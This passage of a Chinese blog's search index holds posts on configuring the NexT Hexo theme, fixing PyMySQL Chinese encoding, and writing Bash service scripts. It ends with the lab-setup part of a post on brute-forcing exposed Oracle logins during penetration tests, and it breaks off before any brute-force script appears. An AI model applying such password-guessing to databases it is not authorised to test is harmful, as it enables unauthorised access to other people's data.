class="comment">#输入自定义文本</span></span><br></pre></td></tr></table></figure><h3 id="SEO设置"><a href="#SEO设置" class="headerlink" title="SEO设置"></a>SEO设置</h3>用于seo优化设置。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">canonical:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">seo:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">index_with_subtitle:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="Menu设置"><a href="#Menu设置" class="headerlink" title="Menu设置"></a>Menu设置</h3>用于导航栏设置。这里的顺序会影响导航栏上显示布局的顺序。<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">menu:</span></span><br><span class="line"><span class="symbol">  home:</span> / || home</span><br><span class="line"><span class="symbol">  categories:</span> <span class="meta-keyword">/categories/</span> || th</span><br><span class="line"><span class="symbol">  archives:</span> <span class="meta-keyword">/archives/</span> || archive</span><br><span class="line"><span class="symbol">  tags:</span> <span class="meta-keyword">/tags/</span> || tags</span><br><span class="line"><span class="symbol">  about:</span> <span class="meta-keyword">/about/</span> || user</span><br><span class="line"></span><br><span class="line"><span class="symbol">menu_settings:</span></span><br><span class="line"><span class="symbol">  icons:</span> true</span><br><span class="line"><span class="symbol">  badges:</span> false <span class="meta">#设置为true会显示具体的数值</span></span><br></pre></td></tr></table></figure><h3 id="Schemes设置"><a href="#Schemes设置" class="headerlink" title="Schemes设置"></a>Schemes设置</h3>用于样式设置。我采用了Mist样式。<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">scheme:</span> Mist</span><br></pre></td></tr></table></figure><h3 id="Sidebar设置"><a href="#Sidebar设置" class="headerlink" title="Sidebar设置"></a>Sidebar设置</h3>用于侧边栏设置。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">site_state:</span> <span class="literal">true</span> <span class="comment">#显示文章、分类、标签</span></span><br><span class="line"></span><br><span class="line"><span class="attr">social:</span> <span class="comment">#友情链接设置 Key: permalink || icon</span></span><br><span class="line">  <span class="attr">GitHub:</span> <span class="string">https://github.com/hywell</span> <span class="string">||</span> <span class="string">github</span></span><br><span class="line"></span><br><span class="line"><span class="attr">social_icons:</span> <span class="comment">#社交图标</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">icons_only:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">transition:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">github_banner:</span> <span class="string">https://github.com/hywell</span> <span class="string">||</span> <span class="string">Follow</span> <span class="string">me</span> <span class="string">on</span> <span class="string">GitHub</span> <span class="comment"># 用于设置右上角GitHub横幅。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 友情链接设置</span></span><br><span class="line"><span class="attr">links_icon:</span> <span class="string">link</span></span><br><span class="line"><span class="attr">links_title:</span> <span class="string">友情链接</span></span><br><span class="line"><span class="attr">links_layout:</span> <span class="string">block</span></span><br><span class="line"><span class="comment">#links_layout: inline</span></span><br><span class="line"><span class="attr">links:</span></span><br><span class="line">  <span class="attr">keyword:</span> <span class="string">link</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 侧边栏头像设置</span></span><br><span class="line"><span class="attr">avatar:</span> <span class="string">/images/avatar.png</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 侧边栏目录显示</span></span><br><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 侧边栏设置</span></span><br><span class="line"><span class="attr">sidebar:</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">left</span>       <span class="comment">#位置</span></span><br><span class="line">  <span class="attr">display:</span> <span class="string">post</span>        <span class="comment">#显示设置</span></span><br><span class="line">  <span class="attr">scrollpercent:</span> <span class="literal">true</span>  <span class="comment">#滚动百分比</span></span><br><span class="line">  <span class="attr">onmobile:</span> <span class="literal">true</span>       <span class="comment">#窄视图启用侧边栏</span></span><br></pre></td></tr></table></figure><h3 id="POST设置"><a href="#POST设置" class="headerlink" title="POST设置"></a>POST设置</h3>用于发布设置。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">scroll_to_more:</span> <span class="literal">true</span>      <span class="comment">#如果文章有摘要（&lt;!-- more --&gt;），会自动滚动到摘要下面。</span></span><br><span class="line"><span class="attr">save_scroll:</span> <span class="literal">true</span>         <span class="comment">#通过cookies来缓存阅读进度</span></span><br><span class="line"><span class="attr">excerpt_description:</span> <span class="literal">true</span> <span class="comment">#自动摘录描述作为序言</span></span><br><span class="line"><span class="attr">auto_excerpt:</span>   <span class="comment">#自动摘录，如果不设置&lt;!-- more --&gt;的话，可以用这个来控制</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">length:</span> <span class="number">150</span></span><br><span class="line"></span><br><span class="line"><span class="attr">post_meta:</span>            <span class="comment">#发布元设置</span></span><br><span class="line">  <span class="attr">item_text:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">created_at:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">updated_at:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">symbols_count_time:</span>   <span class="comment">#字数与阅读时间统计设置 需安装hexo-symbols-count-time</span></span><br><span class="line">  <span class="attr">separated_meta:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">item_text_post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">item_text_total:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">awl:</span> <span class="number">25</span></span><br><span class="line">  <span class="attr">wpm:</span> <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Wechat Subscriber           #微信二维码设置</span></span><br><span class="line"><span class="attr">wechat_subscriber:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">qcode:</span> <span class="string">/images/Wechat.jpg</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">描述文字</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Reward                      #打赏设置</span></span><br><span class="line"><span class="attr">reward_comment:</span> <span class="string">打赏comment</span></span><br><span class="line"><span class="attr">wechatpay:</span> <span class="string">/images/wechatpay.jpg</span></span><br><span class="line"><span class="attr">alipay:</span> <span class="string">/images/alipay.jpg</span></span><br><span class="line"><span class="comment">#bitcoin: /images/bitcoin.png</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare license on posts    #文章license设置</span></span><br><span class="line"><span class="attr">post_copyright:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">CC</span> <span class="string">BY-NC-SA</span> <span class="number">3.0</span></span><br><span class="line">  <span class="attr">license_url:</span> <span class="string">https://creativecommons.org/licenses/by-nc-sa/3.0/</span></span><br></pre></td></tr></table></figure><h3 id="Code-Highlight-theme设置"><a href="#Code-Highlight-theme设置" class="headerlink" title="Code Highlight theme设置"></a>Code Highlight theme设置</h3>用于代码主题设置。<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">highlight_theme:</span> normal</span><br></pre></td></tr></table></figure><h3 id="needmoreshare2设置"><a href="#needmoreshare2设置" class="headerlink" title="needmoreshare2设置"></a>needmoreshare2设置</h3>用于分享设置。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">needmoreshare2:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">postbottom:</span>     <span class="comment">#文章分享</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">options:</span></span><br><span class="line">      <span class="attr">iconStyle:</span> <span class="string">box</span></span><br><span class="line">      <span class="attr">boxForm:</span> <span class="string">horizontal</span></span><br><span class="line">      <span class="attr">position:</span> <span class="string">bottomCenter</span></span><br><span class="line">      <span class="attr">networks:</span> <span class="string">Weibo,Wechat,Douban,QQZone,Twitter,Facebook,Evernote</span></span><br><span class="line">  <span class="attr">float:</span>         <span class="comment">#浮动分享</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">options:</span></span><br><span class="line">      <span class="attr">iconStyle:</span> <span class="string">box</span></span><br><span class="line">      <span class="attr">boxForm:</span> <span class="string">horizontal</span></span><br><span class="line">      <span class="attr">position:</span> <span class="string">middleRight</span></span><br><span class="line">      <span class="attr">networks:</span> <span class="string">Weibo,Wechat,Douban,QQZone,Twitter,Facebook</span></span><br></pre></td></tr></table></figure><h3 id="Local-search设置"><a href="#Local-search设置" class="headerlink" title="Local search设置"></a>Local search设置</h3>用于本地搜索，需要安装<a href="https://github.com/theme-next/hexo-generator-searchdb" target="_blank" rel="noopener" title="hexo-generator-searchdb">hexo-generator-searchdb</a>。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># if auto, trigger search by changing input</span></span><br><span class="line">  <span class="comment"># if manual, trigger search by pressing enter key or search button</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span></span><br><span class="line">  <span class="comment"># show top n results per article, show all results by setting to -1</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Reading-progress-bar设置"><a href="#Reading-progress-bar设置" class="headerlink" title="Reading progress bar设置"></a>Reading progress bar设置</h3>用于阅读进度设置，在top显示，需要扩展<a href="https://github.com/theme-next/theme-next-reading-progress" target="_blank" rel="noopener" title="theme-next-reading-progress">theme-next-reading-progress</a>。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">reading_progress:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">color:</span> <span class="string">"#37c6c0"</span></span><br><span class="line">  <span class="attr">height:</span> <span class="string">2px</span></span><br></pre></td></tr></table></figure><h3 id="pace设置"><a href="#pace设置" class="headerlink" title="pace设置"></a>pace设置</h3>用于页面加载进度设置，我选用了pace-theme-loading-bar，需要扩展<a href="https://github.com/theme-next/theme-next-pace" target="_blank" rel="noopener" title="theme-next-pace">theme-next-pace</a>。<br>推荐几个我个人感觉不错的：</li><li>pace-theme-center-atom</li><li>pace-theme-center-circle</li><li>pace-theme-center-simple</li><li>pace-theme-loading-bar<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">pace:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">pace_theme:</span> <span class="string">pace-theme-loading-bar</span></span><br></pre></td></tr></table></figure><h3 id="Canvas-nest设置"><a href="#Canvas-nest设置" class="headerlink" title="Canvas-nest设置"></a>Canvas-nest设置</h3>用于网页背景效果设置。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">canvas_nest:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="Gitment设置"><a href="#Gitment设置" class="headerlink" title="Gitment设置"></a>Gitment设置</h3>用于页面评论系统设置，本来选用Hypercomments，在样式上设置不好看。因此，换成了Gitment。需要扩展<a href="https://github.com/imsun/gitment" target="_blank" rel="noopener" title="Gitment">Gitment</a><code>npm i --save gitment</code>。<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">gitment:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mint:</span> <span class="literal">true</span> <span class="comment"># RECOMMEND, A mint on Gitment, to support count, language and proxy_gateway</span></span><br><span class="line">  <span class="attr">count:</span> <span class="literal">true</span> <span class="comment"># Show comments count in post meta area</span></span><br><span class="line">  <span class="attr">lazy:</span> <span class="literal">true</span> <span class="comment"># Comments lazy loading with a button</span></span><br><span class="line">  <span class="attr">cleanly:</span> <span class="literal">false</span> <span class="comment"># Hide 'Powered by ...' on footer, and more</span></span><br><span class="line">  <span class="attr">language:</span> <span class="comment"># Force language, or auto switch by theme</span></span><br><span class="line">  <span class="attr">github_user:</span> <span class="string">user</span> <span class="comment"># MUST HAVE, Your Github Username</span></span><br><span class="line">  <span class="attr">github_repo:</span> <span class="string">user.github.io</span> <span class="comment"># MUST HAVE, The name of the repo you use to store Gitment comments</span></span><br><span class="line">  <span class="attr">client_id:</span>  <span class="comment"># MUST HAVE, Github client id for the Gitment</span></span><br><span class="line">  <span class="attr">client_secret:</span>  <span class="comment"># EITHER this or proxy_gateway, Github access secret token for the Gitment</span></span><br><span class="line">  <span class="attr">proxy_gateway:</span> <span class="comment"># Address of api proxy, See: https://github.com/aimingoo/intersect</span></span><br><span class="line">  <span class="attr">redirect_protocol:</span> <span class="comment"># Protocol of redirect_uri with force_redirect_protocol when mint enabled</span></span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>两个配置文件弄得我满脸懵逼！！太难了~~</li><li>配置文件字段名和字段值中间需要空格;</li><li>部分插件安装、配置Hexo、nexT都需进行；</li><li>文章中存在特殊符号，需要使用三个单引号以代码形式，不然会报错；</li><li>所有配置文件icon都可以在<a href="http://fontawesome.io/icons/" target="_blank" rel="noopener">fontawesome</a>选择心仪的，替换即可；</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>博客搭建</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>Python2-Pymysql中文写入</title>
    <url>/archives/40673788.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>python27的编码是一大难点，然而这次的难点并不是在于python，而在于数据库。</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在使用Pymysql向mysql数据库写入中文时，发现出现Warning:(1366, u”Incorrect string value: ‘\x······”)<br><img src="https://i.loli.net/2018/01/11/5a571e468a843.png" alt="pymysql_warning.png"><br>数据库里面的结果为乱码<br><img src="https://i.loli.net/2018/01/11/5a571e444864a.png" alt="database_result.png"></p><h1 id="解决思路"><a href="#解决思路" class="headerlink" title="解决思路"></a>解决思路</h1><p>看到中文乱码，马上就想到编码问题。该问题共涉及到三处编码（有可能还多，想不出来了）：数据库编码、数据来源编码、脚本连接编码。由于数据来源编码能肯定为Unicode，因此需要从脚本连接编码、数据库编码去解决。</p><h1 id="解决历程"><a href="#解决历程" class="headerlink" title="解决历程"></a>解决历程</h1><h2 id="脚本连接编码"><a href="#脚本连接编码" class="headerlink" title="脚本连接编码"></a>脚本连接编码</h2><p>由于pymysql支持charset字段，下意识想到通过charset参数进行设置。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import pymysql.cursors</span><br><span class="line"> </span><br><span class="line">config = &#123;</span><br><span class="line">          <span class="string">'host'</span>:<span class="string">'127.0.0.1'</span>,</span><br><span class="line">          <span class="string">'port'</span>:3306,</span><br><span class="line">          <span class="string">'user'</span>:<span class="string">'root'</span>,</span><br><span class="line">          <span class="string">'password'</span>:<span class="string">''</span>,</span><br><span class="line">          <span class="string">'db'</span>:<span class="string">'test'</span>,</span><br><span class="line">          <span class="string">'charset'</span>:<span class="string">'utf8mb4'</span>,</span><br><span class="line">          <span class="string">'cursorclass'</span>:pymysql.cursors.DictCursor,</span><br><span class="line">          &#125;</span><br><span class="line">connection = pymysql.connect(*<span class="number">*c</span>onfig)</span><br></pre></td></tr></table></figure><p>然后重新运行脚本，发现并没有解决。</p><h2 id="数据库编码"><a href="#数据库编码" class="headerlink" title="数据库编码"></a>数据库编码</h2><p>查看数据库编码，发现数据库默认编码为latin1。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">"char%"</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/01/11/5a571f33ca7f4.png" alt="mysql_charset.png"><br>找到问题所在就方便了！修改database编码即可。<br>由于我使用的是debian，需要修改/etc/mysql/my.cnf文件。</p><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">vim</span> /etc/mysql/my.<span class="keyword">cnf</span></span><br></pre></td></tr></table></figure><p>在[mysqld]字段下面添加character-set-server=utf8，保存并重启mysql服务即可。<br><img src="https://i.loli.net/2018/01/11/5a5720f7adad4.png" alt="my_cnf_set.png"><br>重新查询数据库编码。<br><img src="https://i.loli.net/2018/01/11/5a572256e9607.png" alt="database_charset.png"><br>美滋滋的运行代码，发现还是Warning！！！</p><h2 id="最终解决"><a href="#最终解决" class="headerlink" title="最终解决"></a>最终解决</h2><p>在修改了数据库编码以为脚本可以成功运行的时候，现实跟我说too young！后面兜兜转转，发现重新建立数据库即可！</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>Python27遇到中文的时候，需要特别注意编码；</li><li>Python进行数据交互的时候，每个地方的编码都需要注意；</li><li>配置修改之后，一定要刷新或者新建！！！</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>Python基础</category>
      </categories>
      <tags>
        <tag>Python2</tag>
        <tag>编码</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-Bash(一)</title>
    <url>/archives/33a6bcb.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p><strong>我回来了</strong>，这次接触的是Linux下的shell脚本。</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近常常在Linux下启动一堆服务，每次重启电脑就得敲一堆命令，让我这个懒癌患者深受困扰！！基于不想把它们加入开机自启的前提，就开始动手写个Bash脚本将它们一键全部启动。</p><h1 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h1><h2 id="解释器"><a href="#解释器" class="headerlink" title="解释器"></a>解释器</h2><p>shell脚本首行需要有一个固定的格式，其意义表明使用对应解释器解析该脚本，常常有/bin/bash，/bin/sh等，这里我用的是bash:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br></pre></td></tr></table></figure><h2 id="常用语法"><a href="#常用语法" class="headerlink" title="常用语法"></a>常用语法</h2><p>变量声明：<code>name=</code><br>变量调用：<code>$name</code><br>命令行参数获取：</p><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">$0     <span class="meta"># 命令行第一个变量 往往为脚本名称</span></span><br><span class="line">$1     <span class="meta"># 命令行第二个变量</span></span><br><span class="line">$2     <span class="meta"># 命令行第三个变量</span></span><br><span class="line">$3     <span class="meta"># 命令行第四个变量</span></span><br><span class="line">$init  <span class="meta"># 命令行第init变量</span></span><br></pre></td></tr></table></figure><p>多分支判断：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> str <span class="keyword">in</span></span><br><span class="line">  mode)</span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line">    ;;</span><br><span class="line">  mode)</span><br><span class="line">    <span class="built_in">command</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><h2 id="编写思路"><a href="#编写思路" class="headerlink" title="编写思路"></a>编写思路</h2><p>首先定义各个服务的工作目录设置成对应变量，使用分支判断调用不同功能：启动服务、杀死服务进程、修改服务配置等。</p><h1 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h1><p>根据编写思路，需要使用到的命令大致分为：启动、杀进程（kill）、修改（seq）等。</p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>在不同的环境变量下，启动服务的命令不同。在这里我拿启动python为例。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">python=/usr/bin/python</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">  start)</span><br><span class="line">    <span class="variable">$python</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/01/07/5a51c7bcb2ac3.png" alt="shell-python.png"><br>使用./shell.sh start来启动python<br><img src="https://i.loli.net/2018/01/07/5a51c7fa606cb.png" alt="shell-start.png"></p><h2 id="杀进程"><a href="#杀进程" class="headerlink" title="杀进程"></a>杀进程</h2><p>Linux下使用kill命令即可杀进程，在这里我拿杀死启动的python为例。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">python=/usr/bin/python</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">  <span class="built_in">kill</span>)</span><br><span class="line">    pid_python=`ps -ef|grep <span class="variable">$python</span>|grep -v <span class="string">"<span class="variable">$0</span>"</span>|grep -v <span class="string">"grep"</span>|awk <span class="string">'&#123;print $2&#125;'</span>`</span><br><span class="line">    <span class="built_in">kill</span> -9 <span class="variable">$pid_python</span></span><br><span class="line">    ;;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/01/07/5a51ca441729b.png" alt="shell-python2.png"><br>使用./shell.sh kill来杀死python<br><img src="https://i.loli.net/2018/01/07/5a51ca9ba4a52.png" alt="shell-kill.png"></p><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><p>需要对服务配置文件进行修改的时候，使用Linux的seq命令可以完成。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">config=/opt/config.cnf</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">  config)</span><br><span class="line">    sed -i <span class="string">'s/port=.*/port=80/g'</span> <span class="variable">$config</span></span><br><span class="line">    ;</span><br><span class="line"><span class="keyword">esac</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/01/07/5a51cc9692dd2.png" alt="shell-change.png"><br>使用./shell.sh config来修改config.cnf文件<br><img src="https://i.loli.net/2018/01/07/5a51cc6df312d.png" alt="shell-config.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在编写bash脚本的时候，大部分问题都是由格式、编码等引起。</p><ol><li>在Windows下编写，在Linux下使用，大概率会由换行符导致脚本无法运行：Windows下换行符为CRLF（正则表达式的\r\n，ASCII码的13和10），Unix（or Linux）下换行符为LF（正则表达式的\n）。这个问题会导致在Linux下运行\r\n为无效参数、vi等编辑器打开会出现^M、脚本头部出现乱码字符等;</li><li>Linux Shell脚本单引号、双引号在使用时，具有不同效果：单引号为所见即所得、双引号为解析之后所得;</li><li>seq命令在替换特殊字符时可以用\来转义（正则转义）。<h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1>由于这个脚本涉及到一些机密的东西，完整代码不能上传到GitHub。望理解！</li></ol><!-- rebuild by neat -->]]></content>
      <categories>
        <category>代码基础</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Bash</tag>
      </tags>
  </entry>
  <entry>
    <title>Python2-Oracle爆破</title>
    <url>/archives/209eed3d.html</url>
    <content><![CDATA[<!-- build time:Wed Apr 01 2020 18:35:20 GMT+0800 (中国标准时间) --><p>做渗透的时候遇到Oracle端口对外开放，用python编写脚本去自动爆破，爆破成功就是拿下数据库。</p><a id="more"></a><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="Oracle安装"><a href="#Oracle安装" class="headerlink" title="Oracle安装"></a>Oracle安装</h2><p>去Oracle官网下载Oracle Database 11g，<a href="http://www.oracle.com/technetwork/database/enterprise-edition/downloads/index.html" target="_blank" rel="noopener">下载地址</a>。我这边下载Windows版本进行安装，两个文件都要下载，下载完成之后全部选中解压。<br><img src="https://i.loli.net/2017/09/27/59cb605fa2d3e.png" alt="下载.png"><br>解压之后，运行setup.exe。取消【我希望通过My Oracle Support接受安全更新】勾选，点下一步。<br><img src="https://i.loli.net/2017/09/27/59cb626e2d06c.png" alt="Oracle安装1.png"><br>会跳出一个提示，直接点击【是】即可。<br><img src="https://i.loli.net/2017/09/27/59cb62a8c028f.png" alt="Oracle安装2.png"><br>选择【创建和配置数据库】。<br><img src="https://i.loli.net/2017/09/27/59cb62d879f46.png" alt="Oracle安装3.png"><br>由于我们用来做测试，所以选择【桌面类】即可。<br><img src="https://i.loli.net/2017/09/27/59cb6312e3f19.png" alt="Oracle安装4.png"><br>接下来对数据库进行配置，我这边将全局数据库名设置为Brute，管理口令设置成BruteTest，别的保持默认即可。<br><img src="https://i.loli.net/2017/09/27/59cb639a92d25.png" alt="Oracle安装5.png"><br>如果管理口令不符合Oracle建议的标准，会有一个提示，直接点击【是】即可。<br><img src="https://i.loli.net/2017/09/27/59cb63efeced1.png" alt="Oracle安装6.png"><br>接下来程序就会进行检查，待检查完成会出现一个概要。<br><img src="https://i.loli.net/2017/09/27/59cb642e642b2.png" alt="Oracle安装7.png"><br>点击完成，开始安装。<br><img src="https://i.loli.net/2017/09/27/59cb645ba853a.png" alt="Oracle安装8.png"><br>安装完成之后，点击【口令管理】对用户口令进行修改。<br><img src="https://i.loli.net/2017/09/27/59cb6736eda64.png" alt="Oracle安装9.png"><br>对sys、system两个用户设置新口令。<br><img src="https://i.loli.net/2017/09/27/59cb6784406cd.png" alt="Oracle安装10.png"><br>如果口令不满足复杂性策略，会有一个提示，直接点击【是】即可。<br><img src="https://i.loli.net/2017/09/27/59cb67b138a82.png" alt="Oracle安装11.png"><br>最后Oracle数据库安装成功。<br><img src="https://i.loli.net/2017/09/27/59cb67d5a91b4.png" alt="Oracle安装12.png"></p><h2 id="Oracle配置"><a href="#Oracle配置" class="headerlink" title="Oracle配置"></a>Oracle配置</h2><p>安装完成之后，在所有程序菜单中找到Oracle，打开【Database Control - Brute】。<br><img src="https://i.loli.net/2017/09/27/59cb683b8d4c0.png" alt="Oracle配置1.png"><br>使用sys用户、SYSDBA身份登录。<br><img src="https://i.loli.net/2017/09/27/59cb687d52ef1.png" alt="Oracle配置2.png"></p><h3 id="表空间"><a href="#表空间" class="headerlink" title="表空间"></a>表空间</h3><p>点击【服务器】→【表空间】。<br><img src="https://i.loli.net/2017/09/27/59cb68c3e1c4e.png" alt="Oracle配置3.png"><br>点击【创建】。<br><img src="https://i.loli.net/2017/09/27/59cb68fca5e99.png" alt="Oracle配置4.png"><br>输入名称，点击【添加】。<br><img src="https://i.loli.net/2017/09/27/59cb698785beb.png" alt="Oracle配置5.png"><br>输入文件名，点击【继续】。<br><img src="https://i.loli.net/2017/09/27/59cb69cda94f2.png" alt="Oracle配置6.png"><br>点击【确定】，建立表空间。<br><img src="https://i.loli.net/2017/09/27/59cb6a02a09bc.png" alt="Oracle配置7.png"></p><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p>点击【服务器】→【用户】。<br><img src="https://i.loli.net/2017/09/27/59cb6a54d6d73.png" alt="Oracle配置8.png"><br>点击【创建】。<br><img src="https://i.loli.net/2017/09/27/59cb6a7308d4e.png" alt="Oracle配置9.png"><br>输入名称、口令，点击【确定】。由于只是用于爆破，所以这里就不设置【角色】、【权限】等。<br><img src="https://i.loli.net/2017/09/27/59cb6acc22c4c.png" alt="Oracle配置10.png"></p><h3 id="端口对外开放"><a href="#端口对外开放" class="headerlink" title="端口对外开放"></a>端口对外开放</h3><p>对listener.ora、tnsnames.ora文件进行修改，文件路径类似：\app\Administrator\product\11.2.0\dbhome_2\NETWORK\ADMIN\，根据安装时所选的目录自行寻找。将两个文件里的localhost修改成计算机名。<br><img src="https://i.loli.net/2017/09/27/59cb6c91a688c.png" alt="Oracle配置11.png"><br>重启【OracleDBConsoleBrute】、【OracleOraDb11g_home1TNSListener】服务。<br><img src="https://i.loli.net/2017/09/27/59cb6db843743.png" alt="Oracle配置12.png"><br>可以使用其他电脑成功连接。<br><img src="https://i.loli.net/2017/09/27/59cb6ddf20cbb.png" alt="登录成功.png"></p><h1 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h1><p>Python27有一个库支持对Oracle进行操作，cx_Oracle，使用pip安装即可。</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> cx_Oracle</span><br></pre></td></tr></table></figure><p>安装好之后，需要安装Oracle的client，不同系统安装的方式也不同，具体可以参考<a href="https://oracle.github.io/odpi/doc/installation.html" target="_blank" rel="noopener">官方文档</a>。client安装完成之后，使用cx_Oracle尝试连接。<br><img src="https://i.loli.net/2017/09/27/59cb6fd77dbb3.png" alt="python连接.png"><br>信息错误情况的各种错误信息。<br><img src="https://i.loli.net/2017/09/27/59cb765b9a6e2.png" alt="报错信息.png"></p><h2 id="终端输出"><a href="#终端输出" class="headerlink" title="终端输出"></a>终端输出</h2><p>爆破时，信息有很多。如果不对样式进行设置，导致不能快速找到有效信息。因此，需要对终端输出设置样式。有一个外部库colorama支持输出时的样式设置，通过pip安装即可.</p><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">pip <span class="keyword">install</span> colorama</span><br></pre></td></tr></table></figure><p>安装完成之后，需要先调用init进行初始化。</p><figure class="highlight python"><table><tr><td class="code"><pre><span 